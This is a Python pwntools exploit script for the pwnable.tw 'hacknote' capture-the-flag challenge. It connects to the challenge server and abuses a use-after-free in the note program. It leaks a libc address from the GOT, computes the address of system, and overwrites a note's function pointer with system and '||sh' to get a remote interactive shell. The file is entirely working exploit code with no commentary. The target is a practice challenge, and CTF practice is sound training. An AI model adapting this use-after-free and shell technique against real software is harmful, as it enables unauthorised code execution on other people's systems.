#encoding=utf-8
from pwn import *
from pwnlib import *
exe='./hacknote'
#r=process('./hacknote')
r=remote('chall.pwnable.tw',10102)
#gdb.attach(r,'''b *0x8048a41''')
def add(len,content):
	r.recvuntil('Your choice :')
	r.sendline('1')
	r.recvuntil('Note size :')
	r.sendline(str(len))
	r.recvuntil('Content :')
	r.sendline(content)

def delete(index):
	r.recvuntil('Your choice :')
	r.sendline('2')
	r.recvuntil('Index :')
	r.sendline(str(index))

def show(index):
	r.recvuntil('Your choice :')
	r.sendline('3')
	r.recvuntil('Index :')
	r.sendline(str(index))

def leak():
	libc=ELF('./libc_32.so.6')
	libc_read_addr=libc.symbols['free']
	libc_system_addr=libc.symbols['system']
	add(16,'deadbeef')
	add(16,'babycafe')
	delete(0)
	delete(1)
	pri_got_addr=0x804862b
	read_got_addr=0x0804A018
	add(8,p32(pri_got_addr)+p32(read_got_addr))	
	show(0)
	read_addr=u32(r.recv(4))
	system_addr=read_addr-libc_read_addr+libc_system_addr	
	return system_addr	

leak_system_addr=leak()
delete(2)
#delete(1)
#delete(0)                                  #you have no node in [0], you only have content pointer in 0
print hex(leak_system_addr)
add(8,p32(leak_system_addr)+'||sh')
show(0)
r.interactive()
